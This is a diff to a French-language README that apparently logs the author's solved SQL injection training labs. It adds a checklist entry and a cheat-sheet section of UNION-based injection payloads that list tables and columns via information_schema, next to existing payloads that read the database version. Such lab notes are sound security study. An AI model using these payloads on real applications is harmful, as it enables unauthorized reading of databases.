@@ -14,6 +14,7 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 - [x] 🟠 **Praticien** : [UNION attacks - Retrieving data from other tables](./05-union-retrieve-data.md)
 - [x] 🟠 **Praticien** : [UNION attacks - Retrieving multiple values in a single column](./06-union-concat.md)
 - [x] 🟠 **Praticien** : [SQLi - Querying the database type and version](./07-union-db-version.md)
+- [x] 🟠 Praticien : [SQLi - Listing the database contents on non-Oracle](./08-union-schema-enum.md)
 - [ ] 🔴 **Expert** : Blind SQL injection with conditional responses
 
 ---
@@ -43,6 +44,13 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 * **PostgreSQL :** `' UNION SELECT version(), NULL--`
     * *Méthode :* Appeler la fonction `version()` dans la colonne texte.
 * **Oracle :** `' UNION SELECT banner, NULL FROM v$version--`
-    * *Méthode :* Interroger la table système `v$version`. (Rappel : Oracle exige *toujours* une clause `FROM` dans un SELECT. Si on ne lit pas de table spécifique, on utilise `FROM dual`).     
+    * *Méthode :* Interroger la table système `v$version`. (Rappel : Oracle exige *toujours* une clause `FROM` dans un SELECT. Si on ne lit pas de table spécifique, on utilise `FROM dual`). 
+    
+### 4. Cartographie de la Base de Données (Information Schema)
+*Interroger le dictionnaire de données pour trouver les tables et colonnes cachées (Non-Oracle).*
+
+* **Lister les Tables :** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
+* **Lister les Colonnes d'une Table spécifique :** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='nom_de_la_table_trouvee'--`    
+        
 
 
